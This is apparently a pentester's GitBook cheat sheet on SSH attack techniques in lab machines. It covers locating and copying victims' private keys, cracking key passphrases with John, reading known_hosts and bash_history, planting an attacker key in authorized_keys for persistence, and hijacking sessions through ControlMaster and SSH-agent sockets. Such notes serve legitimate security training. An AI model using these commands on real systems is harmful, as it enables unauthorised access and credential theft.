# (22) SSH

<details>

<summary>Finding SSH Private Keys</summary>

```bash
/home/user/.ssh/id_rsa
```

```bash
find /home/ -name "id_rsa"
```

</details>

<details>

<summary>SSH with Private Key</summary>

```bash
ssh -i svuser.key svuser@controller
```

</details>

<details>

<summary>How to tell if a key is encrypted with passphrase?</summary>

![](<../.gitbook/assets/image (300).png>)

</details>

<details>

<summary>Cracking passphrase of SSH key</summary>

<pre class="language-bash"><code class="lang-bash"><strong>#Copy file over to Kali
</strong><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
</strong><strong>
</strong><strong>#Convert the hash to format used by John &#x26;&#x26; Crack it
</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
</code></pre>

</details>

<details>

<summary>Find Machines that's connected from the victim</summary>

* ```bash
  cat ~/.ssh/known_hosts
  ```
  * If HashKnownHosts is enabled --> entries in known\_hosts are hashed
* ```bash
  cat ~/.bash_history
  ```

</details>

<details>

<summary>SSH Persistency</summary>

* Generate SSH keypair
  *   ```bash
      ssh-keygen
      ```


* Put Kali's public key (\~/.ssh/id\_rsa.pub) to victim authorized\_keys file
  *   ```bash
      echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=" >> /home/linuxvictim/.ssh/authorized_keys
      ```


* Now, can just:
  * ```bash
    ssh linuxvictim@linuxvictim
    ```

</details>

<details>

<summary>SSH from localhost to localhost</summary>

* Useful if SSH port is not opened to external IP

```bash
www-data@nineveh:/dev/shm$ chmod 600 nineveh.priv 
www-data@nineveh:/dev/shm$ ssh -i nineveh.priv amrois@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Wed May 10 08:01:22 2023 from 10.10.14.2
amrois@nineveh:~$ whoami
amrois
```

</details>

<details>

<summary>SSH Hijacking (ControlMaster)</summary>

* Using an existing SSH connection to gain access to another machine
* Allows for the sharing of multiple SSH session over a single network connection

**ControlMaster feature**

* In \~/.ssh/config
  *   ```tsconfig
      Host *
              ControlPath ~/.ssh/controlmaster/%r@%h:%p      --> specifies where the ControlMaster socket file is stored
              ControlMaster auto
              ControlPersist 10m
      ```


* Then,&#x20;
  *   ```bash
      chmod 644 ~/.ssh/config
      mkdir ~/.ssh/controlmaster
      ```


* SSH to the controller box and from controller box ssh to linuxvictim
  *   ```bash
      ssh offsec@controller
      ssh offsec@linuxvictim
      ```


* Now, in \~/.ssh/controlmaster
  * Have `offsec@linuxvictim:22`entry
* Finally, attacker able to ssh into the linuxvictim machine from controller without having to enter any password --> "piggybacking" the active legit session to linuxvictim
  * ```bash
    ssh offsec@linuxvictim
    OR
    ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
    ```

</details>

<details>

<summary>SSH Hijacking (SSH-Agent)</summary>

* Keeps track of user's private keys and allows them to be used without having to repeat their passphrases

- Setting up
  * Installing public key to both intermediate and destination server
    *   ```bash
        ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
        ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
        ```


  * In kali: \~/.ssh/config
    *   ```bash
        ForwardAgent yes
        ```


  * In intermediate server /etc/ssh/sshd\_config
    *   ```bash
        AllowAgentForwarding yes
        ```


  * Start SSH agent on Kali
    *   ```bash
        eval `ssh-agent`
        ```


  * Add our keys to the SSH-agent on kali
    *   ```bash
        ssh-add
        ```


  * Now, able to ssh to intermediate server and from intermediate server ssh to destination server
    *   <pre class="language-bash"><code class="lang-bash"><strong>ssh offsec@controller
        </strong>ssh offsec@linuxvictim
        </code></pre>



Exploiting

*   If there exists a connection from the controller to the linuxvictim that's not the attacker's -->&#x20;

    When the attacker access the controller with the same user as the currently logged in user session, they're able to ssh to the linuxvictim without any creds

- ELSE if the attacker account is different from the current session user
  *   Ensure that user's open SSH-Agent socket is present:

      ```bash
      ps aux | grep ssh
      ```


  * Find PID of SSH process (Eg: bash(2161))
    *   ```bash
        pstree -p offsec | grep ssh
        ```


  * Search for the env variable called SSH\_AUTH\_SOCK
    *   ```bash
        cat /proc/2161/environ
        ```


  * Add SSH auth socket
    *   ```bash
        SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh-add -l
        ```


  * Use new SSH auth socket to login to linuxvictim
    * ```bash
      SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh offsec@linuxvictim
      ```

</details>
